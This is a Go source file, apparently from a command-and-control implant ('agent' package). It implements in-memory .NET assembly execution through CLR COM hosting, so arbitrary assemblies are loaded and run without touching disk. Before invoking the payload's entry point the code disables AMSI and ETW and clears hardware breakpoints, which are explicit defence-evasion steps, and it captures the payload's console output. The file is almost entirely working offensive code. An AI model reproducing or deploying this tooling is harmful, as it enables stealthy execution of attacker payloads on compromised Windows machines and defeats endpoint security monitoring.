//go:build windows

package agent

// ExecuteAssembly — in-memory .NET CLR hosting, no disk write.
//
// COM chain:
//   CLRCreateInstance → ICLRMetaHost → ICLRRuntimeInfo
//   → ICorRuntimeHost::GetDefaultDomain → _AppDomain::Load_3(SAFEARRAY bytes)
//   → _Assembly::get_EntryPoint → _MethodInfo::Invoke_3(null, params)
//
// SAFEARRAY built via oleaut32.dll. No CGO. No temp file.

import (
	"encoding/binary"
	"fmt"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// clrMu serializes CLR execution. A single CLR instance is shared across all
// goroutines; concurrent Invoke_3 calls corrupt Console.Out and the pipe redirect.
var clrMu sync.Mutex

// ── GUIDs ─────────────────────────────────────────────────────────────────────

var (
	// ICLRMetaHost / ICLRRuntimeInfo (same as before)
	clsidCLRMetaHost   = windows.GUID{Data1: 0x9280188d, Data2: 0x0e8e, Data3: 0x4867, Data4: [8]byte{0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}}
	iidICLRMetaHost    = windows.GUID{Data1: 0xd332db9e, Data2: 0xb9b3, Data3: 0x4125, Data4: [8]byte{0x82, 0x07, 0xa1, 0x48, 0x84, 0xf5, 0x32, 0x16}}
	iidICLRRuntimeInfo = windows.GUID{Data1: 0xbd39d1d2, Data2: 0xba2f, Data3: 0x486a, Data4: [8]byte{0x89, 0xb0, 0xb4, 0xb0, 0xcb, 0x46, 0x68, 0x91}}

	// ICorRuntimeHost — classic host, gives us AppDomain COM object
	// CLSID_CorRuntimeHost = {CB2F6723-...} (Data1=0xcb2f6723, NOT 0xcb2f6720)
	clsidCorRuntimeHost = windows.GUID{Data1: 0xcb2f6723, Data2: 0xab3a, Data3: 0x11d2, Data4: [8]byte{0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}}
	iidICorRuntimeHost  = windows.GUID{Data1: 0xcb2f6722, Data2: 0xab3a, Data3: 0x11d2, Data4: [8]byte{0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}}

	// _AppDomain IID (from mscorlib.tlb)
	iidAppDomain = windows.GUID{Data1: 0x05f696dc, Data2: 0x2b29, Data3: 0x3663, Data4: [8]byte{0xad, 0x8b, 0xc4, 0x38, 0x9c, 0xf2, 0xa7, 0x13}}

	// ICLRRuntimeHost kept for fallback path
	clsidCLRRuntimeHost = windows.GUID{Data1: 0x90f1a06e, Data2: 0x7712, Data3: 0x4762, Data4: [8]byte{0x86, 0xb5, 0x7a, 0x5e, 0xba, 0x6b, 0xdb, 0x02}}
	iidICLRRuntimeHost  = windows.GUID{Data1: 0x90f1a06c, Data2: 0x7712, Data3: 0x4762, Data4: [8]byte{0x86, 0xb5, 0x7a, 0x5e, 0xba, 0x6b, 0xdb, 0x02}}
)

// ── DLL procs ─────────────────────────────────────────────────────────────────

var (
	mscoree       = windows.NewLazySystemDLL("mscoree.dll")
	clrCreateInst = mscoree.NewProc("CLRCreateInstance")

	oleaut32              = windows.NewLazySystemDLL("oleaut32.dll")
	safeArrayCreateVector = oleaut32.NewProc("SafeArrayCreateVector")
	safeArrayAccessData   = oleaut32.NewProc("SafeArrayAccessData")
	safeArrayUnaccessData = oleaut32.NewProc("SafeArrayUnaccessData")
	safeArrayPutElement   = oleaut32.NewProc("SafeArrayPutElement")
	safeArrayDestroy      = oleaut32.NewProc("SafeArrayDestroy")
	sysAllocString        = oleaut32.NewProc("SysAllocString")
	sysFreeString         = oleaut32.NewProc("SysFreeString")

	procSetStdHandle = kernel32.NewProc("SetStdHandle")
	procGetStdHandle = kernel32.NewProc("GetStdHandle")
)

const (
	stdOutputHandle = uintptr(0xFFFFFFF5) // (DWORD)-11
	stdErrorHandle  = uintptr(0xFFFFFFF4) // (DWORD)-12

	vtUI1    = uintptr(0x11) // VARTYPE VT_UI1 — byte
	vtBSTR   = uintptr(0x08) // VARTYPE VT_BSTR
	vtVariant = uintptr(0x0c) // VARTYPE VT_VARIANT
	vtArray  = uintptr(0x2000) // VARTYPE VT_ARRAY flag
)

// VARIANT is the 16-byte OLE VARIANT structure (simplified).
type oleVariant struct {
	vt   uint16
	r1   uint16
	r2   uint16
	r3   uint16
	data uint64
}

// ── COM vtable helper ─────────────────────────────────────────────────────────

func clrVtblCall(this uintptr, idx int, args ...uintptr) (uint32, error) {
	if this == 0 {
		return 0x80004003, fmt.Errorf("nil COM pointer at vtbl[%d]", idx)
	}
	vtbl := *(*uintptr)(unsafe.Pointer(this))
	fn := *(*uintptr)(unsafe.Pointer(vtbl + uintptr(idx)*8))
	all := make([]uintptr, 0, 1+len(args))
	all = append(all, this)
	all = append(all, args...)
	r1, _, _ := syscall.SyscallN(fn, all...)
	hr := uint32(r1)
	if hr&0x80000000 != 0 {
		return hr, fmt.Errorf("HRESULT 0x%08X", hr)
	}
	return hr, nil
}

// ── SAFEARRAY helpers ─────────────────────────────────────────────────────────

// byteArrayToSA creates a SAFEARRAY of VT_UI1 from a Go byte slice.
func byteArrayToSA(data []byte) (uintptr, error) {
	sa, _, _ := safeArrayCreateVector.Call(vtUI1, 0, uintptr(len(data)))
	if sa == 0 {
		return 0, fmt.Errorf("SafeArrayCreateVector(VT_UI1) failed")
	}
	var pvData uintptr
	safeArrayAccessData.Call(sa, uintptr(unsafe.Pointer(&pvData)))
	if pvData != 0 {
		copy((*[1 << 30]byte)(unsafe.Pointer(pvData))[:len(data)], data)
	}
	safeArrayUnaccessData.Call(sa)
	return sa, nil
}

// stringsToParamSA builds the SAFEARRAY that _MethodBase::Invoke_3 expects for
// an entry-point with signature  Main(string[] args).
//
// Invoke_3([in] VARIANT obj, [in] SAFEARRAY(VARIANT) parameters, ...)
// parameters[i] = one method parameter as VARIANT.
// Main has ONE parameter: string[] → COM representation is VT_ARRAY|VT_BSTR.
//
// Structure:
//   outer = SAFEARRAY(VT_VARIANT, 1 element)
//   outer[0] = VARIANT { vt: VT_ARRAY|VT_BSTR, parray: inner }
//   inner = SAFEARRAY(VT_BSTR, len(parts) elements) = the actual string[] args
func stringsToParamSA(parts []string) uintptr {
	// inner = SAFEARRAY(VT_BSTR) — the string[] value
	inner, _, _ := safeArrayCreateVector.Call(vtBSTR, 0, uintptr(len(parts)))
	if inner == 0 {
		return 0
	}
	for i, s := range parts {
		pw, _ := windows.UTF16PtrFromString(s)
		bstr, _, _ := sysAllocString.Call(uintptr(unsafe.Pointer(pw)))
		idx := int32(i)
		safeArrayPutElement.Call(inner, uintptr(unsafe.Pointer(&idx)), bstr)
		sysFreeString.Call(bstr)
	}

	// outer = SAFEARRAY(VT_VARIANT, 1) — the object[] parameters array for Invoke
	outer, _, _ := safeArrayCreateVector.Call(vtVariant, 0, 1)
	if outer == 0 {
		safeArrayDestroy.Call(inner)
		return 0
	}

	// Wrap inner SAFEARRAY in a VT_ARRAY|VT_BSTR VARIANT
	var elem oleVariant
	elem.vt = uint16(vtArray | vtBSTR) // 0x2008
	*(*uintptr)(unsafe.Pointer(&elem.data)) = inner

	idx0 := int32(0)
	safeArrayPutElement.Call(outer, uintptr(unsafe.Pointer(&idx0)), uintptr(unsafe.Pointer(&elem)))
	// SafeArrayPutElement calls VariantCopyInd which deep-copies the inner SAFEARRAY.
	// inner is now owned by the outer SAFEARRAY's element copy; we can let it leak
	// (same policy as other SAFEARRAYs in this file — no safeArrayDestroy due to lock deadlock).

	return outer
}

// ── Stdout redirect ───────────────────────────────────────────────────────────
//
// .NET Console.Out uses the C-runtime file descriptor table (fd 1 / fd 2),
// not only the Windows HANDLE returned by GetStdHandle. Two-layer redirect:
//   1. SetStdHandle — updates the Windows HANDLE (for new Console.Out inits)
//   2. _dup2 via ucrtbase/msvcrt — replaces fd 1/2 so an already-cached
//      Console.Out also writes to our pipe.

var (
	lazyCRT     = []*windows.LazyDLL{windows.NewLazySystemDLL("ucrtbase.dll"), windows.NewLazySystemDLL("msvcrt.dll")}
)

// crtProc returns the first resolvable CRT proc across ucrtbase / msvcrt.
func crtProc(name string) *windows.LazyProc {
	for _, dll := range lazyCRT {
		p := dll.NewProc(name)
		if p.Find() == nil {
			return p
		}
	}
	return nil
}

// redirectStdioFile redirects stdout/stderr to a temporary file.
// Returns (outH, tmpPathW, restore, err).
// Caller must CloseHandle(outH) when done; tmpPathW can be passed to DeleteFile.
// Unlike the pipe approach, no EOF signalling is needed — just seek to 0 and read
// after the assembly completes.
func redirectStdioFile() (outH windows.Handle, tmpPathW *uint16, restore func(), err error) {
	k32dll := windows.NewLazySystemDLL("kernel32.dll")
	getTempPath := k32dll.NewProc("GetTempPathW")
	getTempFile := k32dll.NewProc("GetTempFileNameW")

	var tmpDir [260]uint16
	getTempPath.Call(260, uintptr(unsafe.Pointer(&tmpDir[0])))
	prefix, _ := windows.UTF16PtrFromString("clr")
	var tmpPathBuf [260]uint16
	getTempFile.Call(uintptr(unsafe.Pointer(&tmpDir[0])), uintptr(unsafe.Pointer(prefix)), 0, uintptr(unsafe.Pointer(&tmpPathBuf[0])))

	pathSlice := tmpPathBuf[:]
	tmpPath16 := make([]uint16, len(pathSlice))
	copy(tmpPath16, pathSlice)
	tmpPathW = &tmpPath16[0]

	// Open temp file for write + read so we can seek and read after execution.
	outH, err = windows.CreateFile(tmpPathW,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		windows.FILE_SHARE_READ,
		nil, windows.CREATE_ALWAYS, windows.FILE_ATTRIBUTE_NORMAL, 0)
	if err != nil {
		return
	}

	// Layer 1: Windows HANDLE redirect
	origOut, _, _ := procGetStdHandle.Call(stdOutputHandle)
	origErr, _, _ := procGetStdHandle.Call(stdErrorHandle)
	procSetStdHandle.Call(stdOutputHandle, uintptr(outH))
	procSetStdHandle.Call(stdErrorHandle, uintptr(outH))

	// Layer 2: CRT fd 1/2 → outH (so any CRT-using code also writes to the file).
	pOpenOsFH := crtProc("_open_osfhandle")
	pDup2 := crtProc("_dup2")
	pDup := crtProc("_dup")
	pClose := crtProc("_close")

	var origFd1, origFd2 int32 = -1, -1
	if pOpenOsFH != nil && pDup2 != nil {
		if pDup != nil {
			r1, _, _ := pDup.Call(1)
			origFd1 = int32(r1)
			r2, _, _ := pDup.Call(2)
			origFd2 = int32(r2)
		}
		// Duplicate outH so the CRT owns its copy; we keep outH for ReadFile later.
		var outHDup windows.Handle
		if windows.DuplicateHandle(
			windows.CurrentProcess(), outH,
			windows.CurrentProcess(), &outHDup,
			0, false, windows.DUPLICATE_SAME_ACCESS,
		) == nil && outHDup != 0 {
			pipeFd, _, _ := pOpenOsFH.Call(uintptr(outHDup), 0x8001) // _O_WRONLY|_O_BINARY
			if int(int32(pipeFd)) >= 0 {
				pDup2.Call(pipeFd, 1)
				pDup2.Call(pipeFd, 2)
				if pClose != nil {
					pClose.Call(pipeFd)
				}
			}
		}
	}

	restore = func() {
		procSetStdHandle.Call(stdOutputHandle, origOut)
		procSetStdHandle.Call(stdErrorHandle, origErr)
		if pDup2 != nil && pClose != nil {
			if origFd1 >= 0 {
				pDup2.Call(uintptr(origFd1), 1)
				pClose.Call(uintptr(origFd1))
			} else {
				pClose.Call(1)
			}
			if origFd2 >= 0 {
				pDup2.Call(uintptr(origFd2), 2)
				pClose.Call(uintptr(origFd2))
			} else {
				pClose.Call(2)
			}
		}
	}
	return
}

// ── CLR bootstrap (shared between both execution paths) ───────────────────────

// consoleBootstrap forces Console.SetOut() to point at outH by calling
// ConsoleReset.Reset(handleHex) via ICLRRuntimeHost::ExecuteInDefaultAppDomain.
// Reset() writes a diagnostic "[creset:h=<hex>]\n" directly to outH before
// calling Console.SetOut, so the byte appears in the captured output regardless
// of whether Console.Write later works.  outH must already be the redirected
// temp-file handle (i.e. SetStdHandle must have been called first).
func consoleBootstrap(pRuntimeInfo uintptr, outH windows.Handle, writeD func(string)) {
	if writeD == nil {
		writeD = func(string) {}
	}
	var pCLRHost uintptr
	if _, err := clrVtblCall(pRuntimeInfo, 9,
		uintptr(unsafe.Pointer(&clsidCLRRuntimeHost)),
		uintptr(unsafe.Pointer(&iidICLRRuntimeHost)),
		uintptr(unsafe.Pointer(&pCLRHost)),
	); err != nil || pCLRHost == 0 {
		writeD(fmt.Sprintf("creset:gi_fail:%v", err))
		return
	}
	defer clrVtblCall(pCLRHost, 2) //nolint:errcheck

	// Start CLR — no-op if already started (returns S_FALSE=1, still OK).
	if hr, _ := clrVtblCall(pCLRHost, 3); hr != 0 && hr != 1 {
		writeD(fmt.Sprintf("creset:start_fail:%08X", hr))
		return
	}

	// Write resetDLLBytes to a unique temp file (avoid sharing-violation when
	// previous agent instances hold the DLL locked in their CLR AppDomain).
	var tmpDir [260]uint16
	k32dll := windows.NewLazySystemDLL("kernel32.dll")
	getTempPath := k32dll.NewProc("GetTempPathW")
	getTempFile := k32dll.NewProc("GetTempFileNameW")
	getTempPath.Call(260, uintptr(unsafe.Pointer(&tmpDir[0])))
	prefix, _ := windows.UTF16PtrFromString("crt")
	var dllPathBuf [260]uint16
	getTempFile.Call(uintptr(unsafe.Pointer(&tmpDir[0])), uintptr(unsafe.Pointer(prefix)), 0, uintptr(unsafe.Pointer(&dllPathBuf[0])))
	// GetTempFileNameW already created the file; reuse its path with the DLL extension by
	// replacing the .tmp extension.  Instead, just open/overwrite the .tmp file directly.
	dllPathW := &dllPathBuf[0]

	fh, err := windows.CreateFile(dllPathW, windows.GENERIC_WRITE, 0, nil,
		windows.CREATE_ALWAYS, windows.FILE_ATTRIBUTE_NORMAL, 0)
	if err != nil {
		writeD(fmt.Sprintf("creset:write_fail:%v", err))
		return
	}
	var written uint32
	windows.WriteFile(fh, resetDLLBytes, &written, nil)
	windows.CloseHandle(fh)
	defer windows.DeleteFile(dllPathW) //nolint:errcheck

	classW, _ := windows.UTF16PtrFromString("ConsoleReset")
	methodW, _ := windows.UTF16PtrFromString("Reset")
	// Pass the handle value as hex — Reset() creates FileStream from this value
	// directly, bypassing any managed P/Invoke interception of GetStdHandle.
	handleArg := fmt.Sprintf("%x", uintptr(outH))
	handleArgW, _ := windows.UTF16PtrFromString(handleArg)
	var retVal uint32
	hr, rErr := clrVtblCall(pCLRHost, 11,
		uintptr(unsafe.Pointer(dllPathW)),
		uintptr(unsafe.Pointer(classW)),
		uintptr(unsafe.Pointer(methodW)),
		uintptr(unsafe.Pointer(handleArgW)),
		uintptr(unsafe.Pointer(&retVal)),
	)
	writeD(fmt.Sprintf("creset:hr=%08X:err=%v:ret=%d:arg=%s", hr, rErr, retVal, handleArg))
}

// consoleFlushOutput calls ConsoleReset.FlushConsole() to flush any buffered
// Console.Out/Error bytes after the target assembly has run.
// Called in executeAssemblyInner after executeInMemory returns (when ICorRuntimeHost
// COM objects have been released), so it does not contend for CLR internal locks.
func consoleFlushOutput(pRuntimeInfo uintptr, writeD func(string)) {
	if writeD == nil {
		writeD = func(string) {}
	}
	var pCLRHost uintptr
	if _, err := clrVtblCall(pRuntimeInfo, 9,
		uintptr(unsafe.Pointer(&clsidCLRRuntimeHost)),
		uintptr(unsafe.Pointer(&iidICLRRuntimeHost)),
		uintptr(unsafe.Pointer(&pCLRHost)),
	); err != nil || pCLRHost == 0 {
		writeD(fmt.Sprintf("flush:gi_fail:%v", err))
		return
	}
	defer clrVtblCall(pCLRHost, 2) //nolint:errcheck

	if hr, _ := clrVtblCall(pCLRHost, 3); hr != 0 && hr != 1 {
		writeD(fmt.Sprintf("flush:start_fail:%08X", hr))
		return
	}

	var tmpDir [260]uint16
	k32dll := windows.NewLazySystemDLL("kernel32.dll")
	getTempPath := k32dll.NewProc("GetTempPathW")
	getTempFile := k32dll.NewProc("GetTempFileNameW")
	getTempPath.Call(260, uintptr(unsafe.Pointer(&tmpDir[0])))
	prefix, _ := windows.UTF16PtrFromString("crf")
	var dllPathBuf [260]uint16
	getTempFile.Call(uintptr(unsafe.Pointer(&tmpDir[0])), uintptr(unsafe.Pointer(prefix)), 0, uintptr(unsafe.Pointer(&dllPathBuf[0])))
	dllPathW := &dllPathBuf[0]

	fh, err := windows.CreateFile(dllPathW, windows.GENERIC_WRITE, 0, nil,
		windows.CREATE_ALWAYS, windows.FILE_ATTRIBUTE_NORMAL, 0)
	if err != nil {
		writeD(fmt.Sprintf("flush:write_fail:%v", err))
		return
	}
	var dllWritten uint32
	windows.WriteFile(fh, resetDLLBytes, &dllWritten, nil)
	windows.CloseHandle(fh)
	defer windows.DeleteFile(dllPathW) //nolint:errcheck

	classW, _ := windows.UTF16PtrFromString("ConsoleReset")
	methodW, _ := windows.UTF16PtrFromString("FlushConsole")
	argW, _ := windows.UTF16PtrFromString("")
	var retVal uint32
	hr, rErr := clrVtblCall(pCLRHost, 11,
		uintptr(unsafe.Pointer(dllPathW)),
		uintptr(unsafe.Pointer(classW)),
		uintptr(unsafe.Pointer(methodW)),
		uintptr(unsafe.Pointer(argW)),
		uintptr(unsafe.Pointer(&retVal)),
	)
	writeD(fmt.Sprintf("flush:hr=%08X:err=%v:ret=%d", hr, rErr, retVal))
}

func bootstrapCLR() (pMetaHost, pRuntimeInfo uintptr, err error) {
	var ph uintptr
	r1, _, _ := clrCreateInst.Call(
		uintptr(unsafe.Pointer(&clsidCLRMetaHost)),
		uintptr(unsafe.Pointer(&iidICLRMetaHost)),
		uintptr(unsafe.Pointer(&ph)),
	)
	if uint32(r1)&0x80000000 != 0 || ph == 0 {
		err = fmt.Errorf("CLRCreateInstance: HRESULT 0x%08X", uint32(r1))
		return
	}
	pMetaHost = ph

	v4W, _ := windows.UTF16PtrFromString("v4.0.30319")
	var ri uintptr
	if _, err = clrVtblCall(ph, 3,
		uintptr(unsafe.Pointer(v4W)),
		uintptr(unsafe.Pointer(&iidICLRRuntimeInfo)),
		uintptr(unsafe.Pointer(&ri)),
	); err != nil {
		err = fmt.Errorf("GetRuntime: %w", err)
		return
	}
	pRuntimeInfo = ri
	return
}

// ── In-memory path: ICorRuntimeHost → isolated AppDomain → AppDomain.Load_3 ──
//
// Vtable indices:
//
//   ICorRuntimeHost:
//     10 = Start
//     13 = GetDefaultDomain
//
//   _AppDomain (IDispatch-derived, mscorlib.tlb):
//      0 = QueryInterface
//      2 = Release
//     45 = Load_3(SAFEARRAY* rawBytes) → _Assembly*
//
//   _Assembly (IDispatch-derived):
//      2 = Release
//     16 = get_EntryPoint() → _MethodInfo*
//
//   _MethodInfo (IDispatch-derived — GetIDsOfNames returns E_NOTIMPL):
//      2 = Release
//     37 = Invoke_3 (some .NET 4.x TLB) or 39 = Invoke_3 (most common)
//        Invoke_3(VARIANT obj, VARIANT parameters, VARIANT* pRetVal)
//
// AMSI/ETW bypass applied on calling thread before Invoke_3.


// executeInMemory runs the assembly in-memory via ICorRuntimeHost.
// Returns (diagLog, err): diagLog is a newline-separated diagnostic trace collected
// unconditionally via a file-backed log (survives pipe failures and process crashes).
func executeInMemory(pRuntimeInfo uintptr, asmBytes []byte, args string, progress chan<- string, wPipe windows.Handle) (string, error) {
	// Open a diagnostic log file — persists even if the process crashes mid-execution.
	logPath, _ := windows.UTF16PtrFromString(`C:\Windows\Temp\clr_diag.txt`)
	logH, _ := windows.CreateFile(logPath,
		windows.GENERIC_WRITE, windows.FILE_SHARE_READ, nil,
		windows.CREATE_ALWAYS, windows.FILE_ATTRIBUTE_NORMAL, 0)

	var diagBuf strings.Builder
	writeD := func(msg string) {
		line := "[d:" + msg + "]\n"
		diagBuf.WriteString(line)
		if logH != windows.InvalidHandle && logH != 0 {
			b := []byte(line)
			var n uint32
			windows.WriteFile(logH, b, &n, nil)
		}
	}
	defer func() {
		if logH != windows.InvalidHandle && logH != 0 {
			windows.CloseHandle(logH)
		}
	}()

	progress <- "IsLoadable"
	var loadable uint32
	clrVtblCall(pRuntimeInfo, 10, uintptr(unsafe.Pointer(&loadable))) //nolint:errcheck

	progress <- "GetInterface(ICorRuntimeHost)"
	var pCorHost uintptr
	if _, err := clrVtblCall(pRuntimeInfo, 9,
		uintptr(unsafe.Pointer(&clsidCorRuntimeHost)),
		uintptr(unsafe.Pointer(&iidICorRuntimeHost)),
		uintptr(unsafe.Pointer(&pCorHost)),
	); err != nil {
		writeD(fmt.Sprintf("gi_fail:%08X", uint32(0)))
		return diagBuf.String(), fmt.Errorf("GetInterface(ICorRuntimeHost): %w", err)
	}
	writeD("gi_ok")

	progress <- "Start"
	if hr, _ := clrVtblCall(pCorHost, 10); hr != 0 && hr != 1 {
		return diagBuf.String(), fmt.Errorf("ICorRuntimeHost::Start HRESULT 0x%08X", hr)
	}
	writeD("start_ok")
	// Re-apply stdout/stderr redirect immediately after CLR Start.
	// The CLR startup sequence may reset the standard handles internally.
	// Console.Out lazily reads GetStdHandle on first write — doing this here ensures
	// any first Console.Write call (module initializer, assembly load, or Main) sees our pipe.
	if wPipe != 0 && wPipe != windows.InvalidHandle {
		procSetStdHandle.Call(stdOutputHandle, uintptr(wPipe))
		procSetStdHandle.Call(stdErrorHandle, uintptr(wPipe))
		hAfterStart, _, _ := procGetStdHandle.Call(stdOutputHandle)
		writeD(fmt.Sprintf("stdout_after_start: wPipe=%x gsh=%x match=%v", wPipe, hAfterStart, uintptr(wPipe) == hAfterStart))
	}

	progress <- "GetDefaultDomain"
	var pDomainThunk uintptr
	clrVtblCall(pCorHost, 13, uintptr(unsafe.Pointer(&pDomainThunk))) //nolint:errcheck
	if pDomainThunk == 0 {
		writeD("dom_null")
		return diagBuf.String(), fmt.Errorf("cannot obtain AppDomain thunk")
	}
	writeD("dom_ok")

	progress <- "QI_AppDomain"
	var pAppDomain uintptr
	if _, err := clrVtblCall(pDomainThunk, 0,
		uintptr(unsafe.Pointer(&iidAppDomain)),
		uintptr(unsafe.Pointer(&pAppDomain)),
	); err != nil || pAppDomain == 0 {
		writeD("qi_fail")
		return diagBuf.String(), fmt.Errorf("QI _AppDomain: %w", err)
	}
	writeD("qi_ok")
	// Do NOT defer Release on pAppDomain — ICorRuntimeHost-backed AppDomain Release
	// acquires a CLR-wide lock that can block all Go goroutines (observed deadlock).
	// The CLR holds its own internal reference; leaking our COM handle is safe.

	progress <- "patchAMSI"
	patchAMSIVEH()
	disableETWProcess()
	// clearHardwareBreakpoints intentionally NOT deferred — avoids any race with CLR.
	// Called explicitly before Invoke_3 instead (below).

	// ── Console.SetOut via reset assembly ─────────────────────────────────────
	// Load creset6.exe (resetDLLBytes) and invoke its Main(string[] args) with the
	// capture handle as args[0]. This sets Console.Out to a P/Invoke DirectWriter
	// (no buffering) inside the same ICorRuntimeHost session — no ICLRRuntimeHost
	// calls needed, so no CLR lock contention.
	progress <- "loadReset"
	saReset, errReset := byteArrayToSA(resetDLLBytes)
	if errReset == nil && saReset != 0 {
		// No defer safeArrayDestroy — SafeArrayDestroy calls CoTaskMemFree which can
		// contend with CLR's COM memory allocator lock and deadlock. Leak is acceptable.
		var pResetAsm uintptr
		for _, vtbl := range []int{44, 45} {
			_, _ = clrVtblCall(pAppDomain, vtbl, saReset, uintptr(unsafe.Pointer(&pResetAsm)))
			if pResetAsm != 0 {
				break
			}
		}
		if pResetAsm != 0 {
			// No Release defers on CLR COM objects — Release can deadlock via CLR internal locks.
			var pResetEP uintptr
			clrVtblCall(pResetAsm, 16, uintptr(unsafe.Pointer(&pResetEP))) //nolint:errcheck
			if pResetEP != 0 {
				handleHex := fmt.Sprintf("%x", uintptr(wPipe))
				saResetP := stringsToParamSA([]string{handleHex})
				if saResetP == 0 {
					saResetP, _, _ = safeArrayCreateVector.Call(vtVariant, 0, 0)
				}
				// No defer safeArrayDestroy on saResetP — COM lock deadlock risk. Leak.
				var objVarR oleVariant
				var retVarR oleVariant
				// Invoke_3 signature: (this, VARIANT obj, SAFEARRAY* params, VARIANT* pRetVal)
				// On x64: VARIANT is 16 bytes → passed by hidden pointer (we pass &objVarR).
				// SAFEARRAY* is 8 bytes → passed directly (saResetP, not a VARIANT wrapper).
				hr37, _ := clrVtblCall(pResetEP, 37,
					uintptr(unsafe.Pointer(&objVarR)),
					saResetP,
					uintptr(unsafe.Pointer(&retVarR)),
				)
				writeD(fmt.Sprintf("reset_inv3:37:hr=%08X", hr37))
			}
		} else {
			writeD("reset_load_fail")
		}
	} else {
		writeD(fmt.Sprintf("reset_sa_fail:%v", errReset))
	}

	// ── Target assembly ───────────────────────────────────────────────────────
	progress <- "byteArrayToSA"
	saBuf, err := byteArrayToSA(asmBytes)
	if err != nil {
		return diagBuf.String(), err
	}
	// No defer safeArrayDestroy on saBuf — COM lock deadlock risk. Leak.

	progress <- "Load_3"
	var pAssembly uintptr
	loadVtbl := 44
	_, loadErr := clrVtblCall(pAppDomain, 44, saBuf, uintptr(unsafe.Pointer(&pAssembly)))
	if loadErr != nil || pAssembly == 0 {
		pAssembly = 0
		loadVtbl = 45
		_, loadErr = clrVtblCall(pAppDomain, 45, saBuf, uintptr(unsafe.Pointer(&pAssembly)))
	}
	if loadErr != nil || pAssembly == 0 {
		writeD("load3_fail")
		return diagBuf.String(), fmt.Errorf("AppDomain.Load_3 (vtbl 44,45): %w", loadErr)
	}
	writeD(fmt.Sprintf("load3_ok:vtbl=%d", loadVtbl))
	// No Release on pAssembly — CLR COM Release can deadlock (same as pAppDomain above).

	// _Assembly vtable layout (IUnknown=0-2, IDispatch=3-6, methods=7+):
	// 7=get_ToString, 8=Equals, 9=GetHashCode, 10=GetType,
	// 11=get_CodeBase, 12=get_EscapedCodeBase, 13=GetName, 14=GetName_2,
	// 15=get_FullName, 16=get_EntryPoint
	progress <- "get_EntryPoint"
	var pEntryPoint uintptr
	_, errEP := clrVtblCall(pAssembly, 16, uintptr(unsafe.Pointer(&pEntryPoint)))
	if errEP != nil || pEntryPoint == 0 {
		writeD("ep_fail")
		return diagBuf.String(), fmt.Errorf("Assembly.get_EntryPoint (vtbl 16): %w", errEP)
	}
	writeD("ep_ok:vtbl=16")
	// No Release on pEntryPoint — CLR COM Release can deadlock.

	progress <- "stringsToParamSA"
	parts := strings.Fields(args)
	if len(parts) == 0 {
		parts = []string{}
	}
	saParams := stringsToParamSA(parts)
	if saParams == 0 {
		saParams, _, _ = safeArrayCreateVector.Call(vtVariant, 0, 0)
	}
	writeD(fmt.Sprintf("saParams=%x nParts=%d", saParams, len(parts)))
	// No defer safeArrayDestroy on saParams — COM lock deadlock risk. Leak.

	// Re-apply stdout redirect here: CLR startup (ICorRuntimeHost::Start) may reset
	// the standard handle via an internal SetStdHandle call. Doing it again just before
	// Invoke_3 ensures Console.Out (initialized lazily on first write) sees our pipe.
	if wPipe != 0 && wPipe != windows.InvalidHandle {
		procSetStdHandle.Call(stdOutputHandle, uintptr(wPipe))
		procSetStdHandle.Call(stdErrorHandle, uintptr(wPipe))
		hCheck, _, _ := procGetStdHandle.Call(stdOutputHandle)
		writeD(fmt.Sprintf("stdout_rechk: wPipe=%x gsh=%x match=%v", wPipe, hCheck, uintptr(wPipe) == hCheck))
	}

	clearHardwareBreakpoints() // before Invoke_3, not deferred
	progress <- "Invoke_3"
	// _MethodInfo::Invoke_3 via direct vtable call.
	// IDispatch::GetIDsOfNames returns E_NOTIMPL on _MethodInfo — the CLR does not
	// implement late binding for this interface. Call Invoke_3 directly.
	//
	// _MethodInfo vtable (flattened, 0-indexed):
	//   0-2:  IUnknown
	//   3-6:  IDispatch
	//   7-10: _Object    (get_ToString, Equals, GetHashCode, GetType)
	//   11-17: _MemberInfo (get_MemberType..IsDefined)
	//   18:    GetParameters         ← _MethodBase starts
	//   19-22: GetMethodImplFlags..get_CallingConvention
	//   23:    Invoke_2
	//   24-36: get_IsPublic..get_IsConstructor
	//   37:    Invoke_3              ← CORRECT index per go-clr / mscorlib.tlb
	//   38:    get_ReturnType        ← _MethodInfo starts
	//   39:    get_ReturnTypeCustomAttributes
	//   40:    GetBaseDefinition
	//
	// Invoke_3 on x64: (this, VARIANT* obj, SAFEARRAY* params, VARIANT* pRetVal)
	// VARIANT (16 bytes) → passed by hidden pointer (&objVar).
	// SAFEARRAY* (8 bytes) → passed directly (saParams, not &paramsVar wrapper).
	var objVar oleVariant // VT_EMPTY = null obj for static entry point
	var retVal oleVariant

	// _MethodInfo::Invoke_3 is at vtbl index 37 (confirmed: VT_BSTR SAFEARRAY gives
	// COR_E_SAFEARRAYTYPEMISMATCH from vtbl 37, proving it IS Invoke_3).
	writeD("inv3_try:37")
	invHR, invErr := clrVtblCall(pEntryPoint, 37,
		uintptr(unsafe.Pointer(&objVar)),
		saParams,
		uintptr(unsafe.Pointer(&retVal)),
	)
	writeD(fmt.Sprintf("inv3:37:hr=%08X:objVT=%d:retVT=%d:err=%v",
		invHR, objVar.vt, retVal.vt, invErr))

	if invHR == 0x80131604 { // COR_E_TARGETINVOCATIONEXCEPTION — assembly threw
		writeD("inv3_threw:37")
		progress <- "Invoke_3_done"
		return diagBuf.String(), invErr
	}
	if invErr != nil {
		return diagBuf.String(), fmt.Errorf("Invoke_3 vtbl 37: %w", invErr)
	}
	writeD(fmt.Sprintf("inv3_ok:retVT=%d", retVal.vt))
	// Post-invocation diagnostics
	hPost, _, _ := procGetStdHandle.Call(stdOutputHandle)
	writeD(fmt.Sprintf("post_gsh: wPipe=%x gsh=%x match=%v", wPipe, hPost, uintptr(wPipe) == hPost))
	if wPipe != 0 && wPipe != windows.InvalidHandle {
		var postN uint32
		postErr := windows.WriteFile(wPipe, []byte("[post_invoke]\n"), &postN, nil)
		writeD(fmt.Sprintf("post_write: n=%d err=%v", postN, postErr))
	}
	writeD("pre_return")
	if logH != windows.InvalidHandle && logH != 0 {
		windows.CloseHandle(logH)
		logH = 0
	}
	progress <- "Invoke_3_done"
	return diagBuf.String(), nil
}

// ── Fallback path: ICLRRuntimeHost::ExecuteInDefaultAppDomain (file-based) ───

